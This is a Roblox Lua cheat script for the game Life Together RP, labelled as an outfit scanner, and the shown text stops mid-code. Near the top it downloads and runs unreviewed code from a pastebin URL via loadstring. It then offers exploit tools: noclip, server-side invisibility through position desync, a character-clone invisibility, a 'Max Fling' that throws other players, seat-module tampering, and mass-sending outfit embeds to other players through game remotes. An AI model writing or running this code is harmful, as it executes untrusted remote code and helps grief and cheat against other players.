-- Ultimate Roblox Workspace Metadata Engine & Layered Clothing Scanner (Standalone Server Edition)
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
local MarketplaceService = game:GetService("MarketplaceService")
local InsertService = game:GetService("InsertService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")

---load network
pcall(function()
    loadstring(game:HttpGet("https://pastebin.com/raw/GiEmv8Qf"))()
end)
task.wait(1)

getgenv().Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
getgenv().Get = getgenv().Get or (getgenv().g and getgenv().g.Get)




-- Life Together RP Payload Formatter
local function buildBatchPayload(data)
    local accessories = {}
    local order = 1
    if data.Accessories then
        for _, acc in ipairs(data.Accessories) do
            local isLayered = acc.IsLayered == true
            table.insert(accessories, {
                AssetId = acc.AssetId,
                AccessoryType = acc.AccessoryType,
                IsLayered = isLayered,
                Rotation = "  ",
                Position = "  ",
                Scale = "1 1 1",
                Order = isLayered and order or nil,
                Puffiness = isLayered and 0 or nil
            })
            if isLayered then order = order + 1 end
        end
    end

    -- Smart Skin Tone Encoder using captured valid strings
    local safeSkinString = "^l?B" -- Default to ligh tancolor
    if data.SkinTone then
        local r, g, b = data.SkinTone[1], data.SkinTone[2], data.SkinTone[3]
        if ((r + g + b) / 3) < 0.4 then
            safeSkinString = ";<,#" -- Dark Skin String
        end
    end

    return {
        accessories = accessories,
        properties = {
            Head = data.Head or 0,
            Torso = data.Torso or 0,
            LeftArm = data.LeftArm or 0,
            RightArm = data.RightArm or 0,
            LeftLeg = data.LeftLeg or 0,
            RightLeg = data.RightLeg or 0,
            Face = data.Face or 0,
            Shirt = data.Shirt or 0,
            Pants = data.Pants or 0,
            GraphicTShirt = data.GraphicTShirt or 0,
           
            RunAnimation = data.RunAnimation or 0,
            WalkAnimation = data.WalkAnimation or 0,
            JumpAnimation = data.JumpAnimation or 0,
            FallAnimation = data.FallAnimation or 0,
            ClimbAnimation = data.ClimbAnimation or 0,
            IdleAnimation = data.IdleAnimation or 0,
            SwimAnimation = data.SwimAnimation or 0,
            
            HeightScale = data.HeightScale or 1,
            WidthScale = data.WidthScale or 1,
            DepthScale = data.DepthScale or 1,
            HeadScale = data.HeadScale or 1,
            BodyTypeScale = data.BodyTypeScale or 0.25,
            ProportionScale = data.ProportionScale or 0,

            -- Automatically applies the safe string without crashing JSON
            HeadColor = safeSkinString,
            TorsoColor = safeSkinString,
            LeftArmColor = safeSkinString,
            RightArmColor = safeSkinString,
            LeftLegColor = safeSkinString,
            RightLegColor = safeSkinString,
        }
    }
end

-- Reusable Outfit Sharing Function
local function shareOutfitToAll(rawOutfitData, buttonElement, defaultText, defaultColor)
    local payload = buildBatchPayload(rawOutfitData)
    payload.makeups = {} -- Vital to prevent server crash
    
    local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
    
    if not Send then 
        buttonElement.Text = "No Net"
        task.wait(2)
        buttonElement.Text = defaultText
        return 
    end

    buttonElement.Text = "Sharing..."
    buttonElement.BackgroundColor3 = Color3.fromRGB(150, 50, 150)

    task.spawn(function()
        local embedData = {
            outfit_id = -2,
            app = "Avatar",
            accept = "View",
            content = "Custom Outfit",
            func = "view_outfit",
            desc = payload
        }
        local embedJson = HttpService:JSONEncode(embedData)
        
        local sharedCount = 0
        local myId = LocalPlayer.UserId
        
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LocalPlayer and sharedCount < 20 then
                task.spawn(function()
                    pcall(function()
                        local targetId = p.UserId
                        Send("can_users_direct_chat", myId, targetId)
                        
                        local channelStr = ""
                        if myId < targetId then
                            channelStr = tostring(myId) .. " " .. tostring(targetId)
                        else
                            channelStr = tostring(targetId) .. " " .. tostring(myId)
                        end
                        
                        Send("out_embed", channelStr, embedJson, "!EMBED")
                    end)
                end)
                sharedCount = sharedCount + 1
                task.wait(0.1) 
            end
        end
        
        if sharedCount > 0 then
            buttonElement.Text = "Shared!"
            buttonElement.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        else
            buttonElement.Text = "Failed"
            buttonElement.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        end
        
        task.wait(2)
        buttonElement.Text = defaultText
        buttonElement.BackgroundColor3 = defaultColor
    end)
end

-- Prevent duplicate GUIs
if LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DeepMetadataScanner") then
    LocalPlayer.PlayerGui.DeepMetadataScanner:Destroy()
end

-- Create Layout Screen UI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "DeepMetadataScanner"
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

-- Main Drag Frame
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 360, 0, 300)
MainFrame.Position = UDim2.new(0.5, -180, 0.15, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
MainFrame.BorderSizePixel = 1
MainFrame.BorderColor3 = Color3.fromRGB(0, 255, 150)
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui
MainFrame.ClipsDescendants = true

-- Top Title Bar Frame
local TopBar = Instance.new("Frame")
TopBar.Size = UDim2.new(1, 0, 0, 35)
TopBar.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
TopBar.BorderSizePixel = 0
TopBar.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -90, 1, 0)
Title.Position = UDim2.new(0, 10, 0, 0)
Title.Text = "🧬 Deep Live Outfit Scanner"
Title.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 15
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.BackgroundTransparency = 1
Title.Parent = TopBar

-- Close Button
local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 35, 0, 35)
CloseBtn.Position = UDim2.new(1, -35, 0, 0)
CloseBtn.Text = "X"
CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.Font = Enum.Font.SourceSansBold
CloseBtn.TextSize = 16
CloseBtn.BorderSizePixel = 0
CloseBtn.Parent = TopBar

-- Minimize Button
local MinBtn = Instance.new("TextButton")
MinBtn.Size = UDim2.new(0, 35, 0, 35)
MinBtn.Position = UDim2.new(1, -70, 0, 0)
MinBtn.Text = "-"
MinBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
MinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
MinBtn.Font = Enum.Font.SourceSansBold
MinBtn.TextSize = 18
MinBtn.BorderSizePixel = 0
MinBtn.Parent = TopBar

-- Back Button
local BackBtn = Instance.new("TextButton")
BackBtn.Size = UDim2.new(0, 60, 0, 25)
BackBtn.Position = UDim2.new(0, 10, 0, 45)
BackBtn.Text = "◀ Back"
BackBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 90)
BackBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
BackBtn.Font = Enum.Font.SourceSansBold
BackBtn.TextSize = 14
BackBtn.BorderSizePixel = 0
BackBtn.Visible = false
BackBtn.Parent = MainFrame

-- Refresh Button (Left 1/3)
local RefreshBtn = Instance.new("TextButton")
RefreshBtn.Size = UDim2.new(0.33, -10, 0, 25)
RefreshBtn.Position = UDim2.new(0, 10, 0, 45)
RefreshBtn.Text = "Refresh"
RefreshBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 100)
RefreshBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
RefreshBtn.Font = Enum.Font.SourceSansBold
RefreshBtn.TextSize = 14
RefreshBtn.BorderSizePixel = 0
RefreshBtn.Parent = MainFrame

-- Saved Outfits Tab (Middle 1/3)
local SavedTabBtn = Instance.new("TextButton")
SavedTabBtn.Size = UDim2.new(0.33, -5, 0, 25)
SavedTabBtn.Position = UDim2.new(0.33, 5, 0, 45)
SavedTabBtn.Text = "Saved"
SavedTabBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 150)
SavedTabBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SavedTabBtn.Font = Enum.Font.SourceSansBold
SavedTabBtn.TextSize = 14
SavedTabBtn.BorderSizePixel = 0
SavedTabBtn.Parent = MainFrame

-- Tools Tab (Right 1/3)
local ToolsTabBtn = Instance.new("TextButton")
ToolsTabBtn.Size = UDim2.new(0.33, -10, 0, 25)
ToolsTabBtn.Position = UDim2.new(0.66, 5, 0, 45)
ToolsTabBtn.Text = "Tools"
ToolsTabBtn.BackgroundColor3 = Color3.fromRGB(150, 80, 80)
ToolsTabBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ToolsTabBtn.Font = Enum.Font.SourceSansBold
ToolsTabBtn.TextSize = 14
ToolsTabBtn.BorderSizePixel = 0
ToolsTabBtn.Parent = MainFrame

-- Containers for Views
local ContentContainer = Instance.new("Frame")
ContentContainer.Size = UDim2.new(1, 0, 1, -80)
ContentContainer.Position = UDim2.new(0, 0, 0, 80)
ContentContainer.BackgroundTransparency = 1
ContentContainer.Parent = MainFrame

-- Helper function to make all tabs look beautiful and scroll perfectly
local function createTabScroll(name, isVisible)
    local scroll = Instance.new("ScrollingFrame")
    scroll.Name = name
    scroll.Size = UDim2.new(1, -16, 1, -10)
    scroll.Position = UDim2.new(0, 8, 0, 0)
    scroll.BackgroundColor3 = Color3.fromRGB(12, 12, 16) -- Darker, cleaner background
    scroll.ScrollBarThickness = 3
    scroll.BorderSizePixel = 0
    scroll.Visible = isVisible
    scroll.Parent = ContentContainer
    Instance.new("UICorner", scroll).CornerRadius = UDim.new(0, 8)
    
    -- Adding UIPadding fixes the cramped look and adds breathing room
    local padding = Instance.new("UIPadding")
    padding.PaddingTop = UDim.new(0, 8)
    padding.PaddingBottom = UDim.new(0, 40) -- Fixes bottom cutoff when shrunk!
    padding.PaddingLeft = UDim.new(0, 5)
    padding.PaddingRight = UDim.new(0, 5)
    padding.Parent = scroll
    
    local layout = Instance.new("UIListLayout")
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Padding = UDim.new(0, 8)
    layout.Parent = scroll
    
    layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        scroll.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 50)
    end)
    
    return scroll, layout
end

-- Generates all tabs with perfect scrolling and padding instantly
local PlayerScroll, PlayerListLayout = createTabScroll("PlayerScroll", true)
local AssetScroll, AssetListLayout = createTabScroll("AssetScroll", false)
local SavedScroll, SavedListLayout = createTabScroll("SavedScroll", false)
local ToolsScroll, ToolsListLayout = createTabScroll("ToolsScroll", false)

-- ========== NO CLIP TOOL (State-Saving Hybrid) ==========
local RunService = game:GetService("RunService")
local noclipEnabled = false
local noclipConnection = nil
local originalCollisions = {}

local NoclipBtn = Instance.new("TextButton")
NoclipBtn.Size = UDim2.new(1, -5, 0, 40)
NoclipBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
NoclipBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
NoclipBtn.Font = Enum.Font.SourceSansBold
NoclipBtn.TextSize = 16
NoclipBtn.Text = "👻 No Clip: OFF"
NoclipBtn.BorderSizePixel = 0
NoclipBtn.Parent = ToolsScroll

NoclipBtn.MouseButton1Click:Connect(function()
    local char = LocalPlayer.Character
    if not char then return end

    noclipEnabled = not noclipEnabled

    if noclipEnabled then
        NoclipBtn.Text = "👻 No Clip: ON"
        NoclipBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        
        -- 1. Save the original collision states exactly like the reference script
        table.clear(originalCollisions)
        for _, v in ipairs(char:GetDescendants()) do
            if v:IsA("BasePart") then
                originalCollisions[v] = v.CanCollide
            end
        end

        -- 2. Force it false continuously to fight the Humanoid's auto-physics
        noclipConnection = RunService.Stepped:Connect(function()
            for _, v in ipairs(char:GetDescendants()) do
                if v:IsA("BasePart") then
                    v.CanCollide = false
                end
            end
        end)
    else
        NoclipBtn.Text = "👻 No Clip: OFF"
        NoclipBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        
        -- Stop the forced loop
        if noclipConnection then 
            noclipConnection:Disconnect() 
            noclipConnection = nil 
        end
        
        -- 3. Restore original collisions cleanly like the reference script
        for part, originalState in pairs(originalCollisions) do
            if part and part.Parent then
                part.CanCollide = originalState
            end
        end
        table.clear(originalCollisions)
    end
end)
-- ========== FE INVISIBLE TOOL (Desync Method) ==========
local feInvisEnabled = false
local invisConnections = {}
local ghostParts = {}

local FeInvisBtn = Instance.new("TextButton")
FeInvisBtn.Size = UDim2.new(1, -5, 0, 40)
FeInvisBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
FeInvisBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
FeInvisBtn.Font = Enum.Font.SourceSansBold
FeInvisBtn.TextSize = 16
FeInvisBtn.Text = "🫥 Server Invis: OFF"
FeInvisBtn.BorderSizePixel = 0
FeInvisBtn.Parent = ToolsScroll

FeInvisBtn.MouseButton1Click:Connect(function()
    local char = LocalPlayer.Character
    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
    local rootPart = char and char:FindFirstChild("HumanoidRootPart")
    
    if not char or not humanoid or not rootPart then return end

    feInvisEnabled = not feInvisEnabled

    if feInvisEnabled then
        FeInvisBtn.Text = "🫥 Server Invis: ON"
        FeInvisBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        
        -- Make us look like a ghost locally so we know it's on
        table.clear(ghostParts)
        for _, obj in pairs(char:GetDescendants()) do 
            if obj:IsA("BasePart") and obj.Transparency == 0 then 
                table.insert(ghostParts, obj)
                obj.Transparency = 0.5
            end 
        end

        -- The Desync Loop
        invisConnections[1] = RunService.Heartbeat:Connect(function()
            if feInvisEnabled and rootPart and humanoid then
                local cf = rootPart.CFrame
                local camOffset = humanoid.CameraOffset

                -- Fling way under the map exactly when the server updates
                local hidden = cf * CFrame.new(0, -200000, 0)
                rootPart.CFrame = hidden
                humanoid.CameraOffset = hidden:ToObjectSpace(CFrame.new(cf.Position)).Position

                -- Wait for our local screen to render
                RunService.RenderStepped:Wait()

                -- Snap back to normal for our screen
                rootPart.CFrame = cf
                humanoid.CameraOffset = camOffset
            end
        end)
    else
        FeInvisBtn.Text = "🫥 Server Invis: OFF"
        FeInvisBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        
        -- Cleanup connections
        for _, conn in pairs(invisConnections) do conn:Disconnect() end
        table.clear(invisConnections)
        
        -- Restore our character's looks and camera
        for _, part in pairs(ghostParts) do
            if part and part.Parent then
                part.Transparency = 0
            end
        end
        if humanoid then
            humanoid.CameraOffset = Vector3.new(0,0,0)
        end
    end
end)

---
-- ========== ANTI-FLING & ANTI-VEHICLE FLING ==========
local antiFlingEnabled = false
local antiFlingConnection = nil

local AntiFlingBtn = Instance.new("TextButton")
AntiFlingBtn.Size = UDim2.new(1, -5, 0, 40)
AntiFlingBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
AntiFlingBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiFlingBtn.Font = Enum.Font.SourceSansBold
AntiFlingBtn.TextSize = 16
AntiFlingBtn.Text = "🛡️ Anti-Fling: OFF"
AntiFlingBtn.BorderSizePixel = 0
AntiFlingBtn.Parent = ToolsScroll

AntiFlingBtn.MouseButton1Click:Connect(function()
    antiFlingEnabled = not antiFlingEnabled

    if antiFlingEnabled then
        AntiFlingBtn.Text = "🛡️ Anti-Fling: ON"
        AntiFlingBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        
        -- Runs before physics calculate to prevent touches
        antiFlingConnection = RunService.Stepped:Connect(function()
            local myChar = LocalPlayer.Character
            if not myChar then return end

            -- 1. PURE ANTI-FLING: Disable collisions for all other players globally
            for _, p in ipairs(Players:GetPlayers()) do
                if p ~= LocalPlayer and p.Character then
                    for _, part in ipairs(p.Character:GetDescendants()) do
                        if part:IsA("BasePart") and part.CanCollide then
                            part.CanCollide = false
                        end
                    end
                end
            end

            -- 2. VELOCITY STABILIZER: Protects you and your vehicle from physics spikes
            local myRoot = myChar:FindFirstChild("HumanoidRootPart")
            local myHum = myChar:FindFirstChildOfClass("Humanoid")
            
            if myHum and myHum.SeatPart then
                -- Anti-Vehicle Fling Logic
                local vehicle = myHum.SeatPart:FindFirstAncestorOfClass("Model")
                if vehicle then
                    local pPart = vehicle.PrimaryPart or myHum.SeatPart
                    if pPart then
                        if pPart.AssemblyAngularVelocity.Magnitude > 50 or pPart.AssemblyLinearVelocity.Magnitude > 400 then
                            pPart.AssemblyAngularVelocity = Vector3.zero
                            pPart.AssemblyLinearVelocity = Vector3.new(0, -10, 0)
                        end
                    end
                end
            elseif myRoot then
                -- Standard Player Anti-Fling Fallback
                if myRoot.AssemblyAngularVelocity.Magnitude > 50 or myRoot.AssemblyLinearVelocity.Magnitude > 250 then
                    myRoot.AssemblyAngularVelocity = Vector3.zero
                    myRoot.AssemblyLinearVelocity = Vector3.new(0, -10, 0)
                end
            end
        end)
    else
        AntiFlingBtn.Text = "🛡️ Anti-Fling: OFF"
        AntiFlingBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        
        if antiFlingConnection then
            antiFlingConnection:Disconnect()
            antiFlingConnection = nil
        end
    end
end)

-- ========== LIFE TOGETHER RP ANTI-SIT TOOL ==========
local ltAntiSitEnabled = false
local ltAntiSitConnections = {}
local seatModule = nil

-- Attempt to find Life Together's specific Seat module
task.spawn(function()
    pcall(function()
        for _, v in pairs(game:GetDescendants()) do
            if v:IsA("ModuleScript") and v.Name == "Seat" then
                local s = require(v)
                -- Verify it's the right module by checking for the 'enabled.set' function
                if type(s) == "table" and s.enabled and s.enabled.set then
                    seatModule = s
                    break
                end
            end
        end
    end)
end)

local function hookLtCharacter(character)
    if not character then return end
    local humanoid = character:WaitForChild("Humanoid", 5)
    if not humanoid then return end

    local conn = humanoid:GetPropertyChangedSignal("Sit"):Connect(function()
        if not ltAntiSitEnabled then return end
        
        if humanoid.Sit then
            humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
            task.spawn(function()
                if humanoid.SeatPart then
                    local weld = humanoid.SeatPart:FindFirstChildOfClass("Weld")
                    if weld then weld:Destroy() end
                    local prox = humanoid.SeatPart:FindFirstChildOfClass("ProximityPrompt")
                    if prox and prox.Enabled == false then
                        prox.Enabled = true
                    end
                end
                for _ = 1, 5 do
                    task.wait()
                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                    humanoid.Sit = false
                end
                humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
            end)
        end
    end)
    table.insert(ltAntiSitConnections, conn)
end

local LtAntiSitBtn = Instance.new("TextButton")
LtAntiSitBtn.Size = UDim2.new(1, -5, 0, 40)
LtAntiSitBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
LtAntiSitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
LtAntiSitBtn.Font = Enum.Font.SourceSansBold
LtAntiSitBtn.TextSize = 16
LtAntiSitBtn.Text = "🪑 LT Anti-Sit: OFF"
LtAntiSitBtn.BorderSizePixel = 0
LtAntiSitBtn.Parent = ToolsScroll

LtAntiSitBtn.MouseButton1Click:Connect(function()
    ltAntiSitEnabled = not ltAntiSitEnabled
    
    if ltAntiSitEnabled then
        LtAntiSitBtn.Text = "🪑 LT Anti-Sit: ON"
        LtAntiSitBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        
        -- 1. Apply your custom character physics hook
        hookLtCharacter(LocalPlayer.Character)
        local charConn = LocalPlayer.CharacterAdded:Connect(hookLtCharacter)
        table.insert(ltAntiSitConnections, charConn)
        
        -- 2. Attack the Life Together Seat Module specifically (from your script)
        if seatModule then
            local loopConn = RunService.Stepped:Connect(function()
                if ltAntiSitEnabled then
                    pcall(function() seatModule.enabled.set(false) end)
                end
            end)
            table.insert(ltAntiSitConnections, loopConn)
        end
        
    else
        LtAntiSitBtn.Text = "🪑 LT Anti-Sit: OFF"
        LtAntiSitBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        
        -- Cleanup all loops and connections
        for _, conn in pairs(ltAntiSitConnections) do
            if conn and conn.Connected then conn:Disconnect() end
        end
        table.clear(ltAntiSitConnections)
        
        -- Restore Life Together's Seat Module back to normal
        if seatModule then
            pcall(function() seatModule.enabled.set(true) end)
        end
    end
end)

----------
-- ========== SYSTEM BROKEN V2 (Max Intensity Fling) ==========
local RunService = game:GetService("RunService")
local isSystemFlinging = false
local systemFlingLoop = nil
local originalProperties = {}

local FlingBtn = Instance.new("TextButton")
FlingBtn.Size = UDim2.new(1, -5, 0, 40)
FlingBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
FlingBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
FlingBtn.Font = Enum.Font.SourceSansBold
FlingBtn.TextSize = 16
FlingBtn.Text = "🌪️ Max Fling: OFF"
FlingBtn.BorderSizePixel = 0
FlingBtn.Parent = ToolsScroll

FlingBtn.MouseButton1Click:Connect(function()
    local char = LocalPlayer.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end

    isSystemFlinging = not isSystemFlinging

    if isSystemFlinging then
        FlingBtn.Text = "🌪️ Max Fling: ON"
        FlingBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        
        -- 1. Increase our mass to the engine's limit so we don't bounce off targets
        table.clear(originalProperties)
        for _, part in ipairs(char:GetChildren()) do
            if part:IsA("BasePart") then
                originalProperties[part] = part.CustomPhysicalProperties
                part.CustomPhysicalProperties = PhysicalProperties.new(100, 0, 0, 100, 100)
            end
        end

        systemFlingLoop = RunService.Heartbeat:Connect(function()
            if not char or not root then return end
            
            -- Save your real movement and camera orientation
            local savedVel = root.Velocity
            local savedRot = root.RotVelocity
            
            -- 2. Violent Multi-Axis Spike (-50,000 Y combined with random X/Z rotation)
            root.Velocity = Vector3.new(math.random(-50000, 50000), -50000, math.random(-50000, 50000))
            root.RotVelocity = Vector3.new(math.random(-50000, 50000), math.random(-50000, 50000), math.random(-50000, 50000))
            
            -- Wait for the engine to transfer this massive energy to the target
            RunService.RenderStepped:Wait()
            
            -- Instantly restore so we don't break our own screen or fall into the void
            if root then
                root.Velocity = savedVel
                root.RotVelocity = savedRot
            end
        end)
    else
        FlingBtn.Text = "🌪️ Max Fling: OFF"
        FlingBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        
        if systemFlingLoop then
            systemFlingLoop:Disconnect()
            systemFlingLoop = nil
        end
        if root then
            root.Velocity = Vector3.zero
            root.RotVelocity = Vector3.zero
        end
        
        -- Restore original avatar mass
        for part, props in pairs(originalProperties) do
            if part and part.Parent then
                part.CustomPhysicalProperties = props
            end
        end
        table.clear(originalProperties)
    end
end)
-- ========== INVISIBLE+ (AmokahFox Clone Method) ==========
local isVisPlusOn = false
local invisRunning = false
local invisFix = nil
local invisDied = nil
local RealCharacter = nil
local FakeCharacter = nil

local VisPlusBtn = Instance.new("TextButton")
VisPlusBtn.Size = UDim2.new(1, -5, 0, 40)
VisPlusBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
VisPlusBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
VisPlusBtn.Font = Enum.Font.SourceSansBold
VisPlusBtn.TextSize = 16
VisPlusBtn.Text = "👻 Invisible+: OFF"
VisPlusBtn.BorderSizePixel = 0
VisPlusBtn.Parent = ToolsScroll

local function TurnVisible()
    if not invisRunning then return end
    
    if invisFix then invisFix:Disconnect() end
    if invisDied then invisDied:Disconnect() end
    
    local Player = game.Players.LocalPlayer
    if RealCharacter and RealCharacter.Parent == game.Lighting then
        local CF_1 = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") and Player.Character.HumanoidRootPart.CFrame
        
        FakeCharacter:Destroy()
        Player.Character = RealCharacter
        RealCharacter.Parent = workspace
        
        if CF_1 and RealCharacter:FindFirstChild("HumanoidRootPart") then
            RealCharacter.HumanoidRootPart.CFrame = CF_1
        end
        
        local anim = RealCharacter:FindFirstChild("Animate")
        if anim then
            anim.Disabled = true
            anim.Disabled = false
        end
    end
    invisRunning = false
    isVisPlusOn = false
    VisPlusBtn.Text = "👻 Invisible+: OFF"
    VisPlusBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
end

local function Respawn()
    if not invisRunning then return end
    local Player = game.Players.LocalPlayer
    pcall(function()
        Player.Character = RealCharacter
        task.wait()
        RealCharacter.Parent = workspace
        local hum = RealCharacter:FindFirstChildWhichIsA('Humanoid')
        if hum then hum:Destroy() end
        TurnVisible()
    end)
end

local function TurnInvisiblePlus()
    if invisRunning then return end
    invisRunning = true
    isVisPlusOn = true
    VisPlusBtn.Text = "👻 Invisible+: ON"
    VisPlusBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)

    local Player = game.Players.LocalPlayer
    RealCharacter = Player.Character
    if not RealCharacter then return TurnVisible() end
    
    RealCharacter.Archivable = true
    FakeCharacter = RealCharacter:Clone()
    FakeCharacter.Parent = game.Lighting
    FakeCharacter.Name = ""
    
    local Void = workspace.FallenPartsDestroyHeight

    invisFix = game:GetService("RunService").Stepped:Connect(function()
        pcall(function()
            local root = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if root then
                if root.Position.Y <= Void then
                    Respawn()
                end
            end
        end)
    end)

    for _, v in ipairs(FakeCharacter:GetDescendants()) do
        if v:IsA("BasePart") then
            if v.Name == "HumanoidRootPart" then
                v.Transparency = 1
            else
                v.Transparency = 0.5
            end
        end
    end

    local fakeHum = FakeCharacter:FindFirstChildOfClass('Humanoid')
    if fakeHum then
        invisDied = fakeHum.Died:Connect(function()
            Respawn()
        end)
    end

    local CF_1 = RealCharacter:FindFirstChild("HumanoidRootPart") and RealCharacter.HumanoidRootPart.CFrame
    RealCharacter:MoveTo(Vector3.new(0, math.pi * 1000000, 0))
    
    workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
    task.wait(0.2)
    workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
    
    RealCharacter.Parent = game.Lighting
    FakeCharacter.Parent = workspace
    if CF_1 and FakeCharacter:FindFirstChild("HumanoidRootPart") then
        FakeCharacter.HumanoidRootPart.CFrame = CF_1
    end
    Player.Character = FakeCharacter
    
    workspace.CurrentCamera.CameraSubject = FakeCharacter:FindFirstChildWhichIsA('Humanoid')
    
    local anim = FakeCharacter:FindFirstChild("Animate")
    if anim then
        anim.Disabled = true
        anim.Disabled = false
    end
end

VisPlusBtn.MouseButton1Click:Connect(function()
    if isVisPlusOn then
        TurnVisible()
    else
        TurnInvisiblePlus()
    end
end)
-- ========== PURE ANTI-SPIN SPECTATE LOGIC ==========
local isViewing = false
local viewLoop = nil
local viewPart = nil
local selectedSpectateTarget = nil

local function stopView()
    isViewing = false
    selectedSpectateTarget = nil
    if viewLoop then viewLoop:Disconnect() viewLoop = nil end
    if viewPart then viewPart:Destroy() viewPart = nil end
    
    local cam = workspace.CurrentCamera
    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if cam and hum then
        cam.CameraSubject = hum
    end
end

local function startView(targetPlayer)
    stopView()
    if not targetPlayer or not targetPlayer.Character then return end
    isViewing = true
    selectedSpectateTarget = targetPlayer
    
    viewPart = Instance.new("Part")
    viewPart.Transparency = 1
    viewPart.CanCollide = false
    viewPart.Anchored = true
    viewPart.Parent = workspace
    
    workspace.CurrentCamera.CameraSubject = viewPart
    
    viewLoop = RunService.RenderStepped:Connect(function()
        if not selectedSpectateTarget or not selectedSpectateTarget.Character then return end
        local tRoot = selectedSpectateTarget.Character:FindFirstChild("HumanoidRootPart")
        if tRoot then
            viewPart.CFrame = CFrame.new(tRoot.Position)
        end
    end)
end

-- Global Unview Button for Tools Tab
local UnviewBtn = Instance.new("TextButton")
UnviewBtn.Size = UDim2.new(1, -5, 0, 40)
UnviewBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
UnviewBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
UnviewBtn.Font = Enum.Font.SourceSansBold
UnviewBtn.TextSize = 16
UnviewBtn.Text = "🛑 Stop Spectating (Unview)"
UnviewBtn.BorderSizePixel = 0
UnviewBtn.Parent = ToolsScroll

UnviewBtn.MouseButton1Click:Connect(stopView)

-- ========== AVATAR SCALER TOOL (Collapsible) ==========
local ScalerFrame = Instance.new("Frame")
ScalerFrame.Size = UDim2.new(1, -5, 0, 30) -- Starts collapsed
ScalerFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
ScalerFrame.BorderSizePixel = 0
ScalerFrame.ClipsDescendants = true
ScalerFrame.Parent = ToolsScroll

-- The Clickable Title / Dropdown Button
local ScalerToggleBtn = Instance.new("TextButton")
ScalerToggleBtn.Size = UDim2.new(1, 0, 0, 30)
ScalerToggleBtn.Position = UDim2.new(0, 0, 0, 0)
ScalerToggleBtn.Text = "  📏 Custom Avatar Scaler [ ▼ ]"
ScalerToggleBtn.TextColor3 = Color3.fromRGB(0, 255, 200)
ScalerToggleBtn.Font = Enum.Font.SourceSansBold
ScalerToggleBtn.TextSize = 14
ScalerToggleBtn.TextXAlignment = Enum.TextXAlignment.Left
ScalerToggleBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
ScalerToggleBtn.BorderSizePixel = 0
ScalerToggleBtn.Parent = ScalerFrame

-- Container for all the inputs (Hidden by default)
local ScalerContent = Instance.new("Frame")
ScalerContent.Size = UDim2.new(1, 0, 1, -30)
ScalerContent.Position = UDim2.new(0, 0, 0, 30)
